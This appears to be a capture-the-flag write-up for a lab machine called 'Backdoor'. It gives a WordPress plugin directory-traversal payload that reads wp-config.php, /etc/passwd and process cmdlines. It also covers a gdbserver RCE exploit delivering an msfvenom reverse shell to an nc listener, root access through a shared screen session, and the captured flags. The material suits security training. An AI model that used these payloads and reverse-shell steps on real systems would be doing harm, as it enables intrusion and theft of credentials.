# Backdoor

1. Nmap reveals port 80 and 22

2. Gobuster reveals Wordpress, the first directory is /wp-content which contains plugins, inside plugins folder there is a ebook-download plugin, which searching reveals an exploit available.

````
# searchsploit ebook download
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal                                            | php/webapps/39575.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
````

````
# cat 39575.txt 
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
````

3. Try to execute the exploit
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

4. Enumerates
````
GET /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.125
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Connection: close


````

5. Enumarates process
````
GET /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$PID$/cmdline HTTP/1.1
Host: 10.10.11.125
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Connection: close


````
````
HTTP/1.1 200 OK
Date: Fri, 14 Jan 2022 01:43:04 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Transfer-Encoding: Binary
Content-disposition: attachment; filename="cmdline"
Content-Length: 232
Connection: close
Content-Type: application/octet-stream

../../../../../../proc/854/cmdline../../../../../../proc/854/cmdline../../../../../../proc/854/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
````
[man gdbserver](https://sourceware.org/gdb/onlinedocs/gdb/Server.html)

`gdbserver --once 0.0.0.0:1337 /bin/true`

* The --once option allows reusing the same port number for connecting to multiple instances of gdbserver running on the same host, since each instance closes its port after the first connection. 
* 0.0.0.0:1337 listen on any interface on port 1337
* /bin/true name of the program to be debugged

````
HTTP/1.1 200 OK
Date: Fri, 14 Jan 2022 01:32:20 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Transfer-Encoding: Binary
Content-disposition: attachment; filename="cmdline"
Content-Length: 234
Connection: close
Content-Type: application/octet-stream

../../../../../../proc/858/cmdline../../../../../../proc/858/cmdline../../../../../../proc/858/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
````

[man screen](https://linux.die.net/man/1/screen)
`screen -dmS root`
* -dm creates a new session but does not attach to it
* session name root

6. Exploitation 
````
# searchsploit gdbserver
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                   | linux/remote/50539.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
````

````
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
````

````
# nc -nlvp 4444
````

````
# python3 50539.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
````

````
# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.125] 49944
id
uid=1000(user) gid=1000(user) groups=1000(user)
python3 -c "import pty; pty.spawn('/bin/bash')"
user@Backdoor:/home/user$ cat user.txt  
cat user.txt
b43f7cb5891eae348070ac16b82a3a6a
````

7. Privilege escalation
````
user@Backdoor:/home/user$ export TERM='vt100'
user@Backdoor:/home/user$ screen -x root/root
root@Backdoor:~# cat root.txt
cat root.txt
c8d447a5ab07e554a8aa14e86becd194

````
screen -x 
* Attach to a not detached screen session. (Multi display mode). 

[Github pspy](https://github.com/DominicBreuker/pspy/blob/master/README.md)

# Secrets
* FLAG_USER = b43f7cb5891eae348070ac16b82a3a6a
* FLAG_ROOT = c8d447a5ab07e554a8aa14e86becd194
